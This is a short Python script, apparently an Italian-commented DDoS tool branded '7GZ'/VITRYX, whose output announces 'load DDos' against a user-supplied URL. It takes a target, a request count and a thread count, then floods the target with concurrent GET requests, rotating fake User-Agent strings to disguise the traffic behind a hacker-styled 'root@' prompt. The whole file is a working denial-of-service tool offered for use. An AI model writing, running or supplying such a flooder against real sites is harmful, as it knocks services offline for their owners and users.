import threading
import requests
import random
import time
import sys
from colorama import Fore, Style, init
import getpass
import socket
import os

# Inizializza colori
init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Ottieni info utente/sistema per il prompt
username = getpass.getuser()
hostname = socket.gethostname()

# Prompt stile ┌─── (user@hostname)
def print_header():
    sys.stdout.write(Fore.MAGENTA + "┌─── (root" +  "@" + hostname + ")" + Style.RESET_ALL + "\n")
    sys.stdout.flush()

# Prompt stile └─ [VITRYX] | [INPUT] >
def vitryx_input(prompt_label="INPUT"):
    sys.stdout.write(Fore.MAGENTA + "└─ " + Fore.MAGENTA + "[" + Style.RESET_ALL + "7GZ" + Fore.BLUE + "]")
    sys.stdout.write("  |  " + Fore.MAGENTA + "[" + Style.RESET_ALL + f"{prompt_label}" + Fore.BLUE + "]" + Style.RESET_ALL + " > ")
    sys.stdout.flush()
    return input()

# User-Agent finti
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)",
    "curl/7.68.0",
    "PostmanRuntime/7.29.0"
]

def send_request(i, url):
    headers = {
        "User-Agent": random.choice(user_agents)
    }
    try:
        start = time.time()
        response = requests.get(url, headers=headers, timeout=2)
        elapsed = round((time.time() - start) * 1000, 2)
        print(Fore.GREEN + f"[{i+1:04}] ✓ {response.status_code} in {elapsed} ms - {headers['User-Agent']}")
    except Exception as e:
        print(Fore.RED + f"[{i+1:04}] ✗ Error: {e}")

def run_test(url, total_requests, thread_limit):
    print(Fore.LIGHTBLUE_EX + f"\n🚀 load DDos {url} in {total_requests} request and {thread_limit} thread...\n")
    threads = []
    for i in range(total_requests):
        t = threading.Thread(target=send_request, args=(i, url))
        threads.append(t)
        t.start()
        if i % thread_limit == 0:
            time.sleep(0.05)
    for t in threads:
        t.join()
    print(Fore.BLUE + "\n[+] Successfully")



if __name__ == "__main__":
    while True:
        clear()
        print_header()
        url = vitryx_input("URL").strip()
        print_header()


        total_requests = int(vitryx_input("NUM-REQUESTS").strip())
        print_header()

        thread_limit = int(vitryx_input("MAX-THREADS").strip())
        run_test(url, total_requests, thread_limit)
        time.sleep(1)



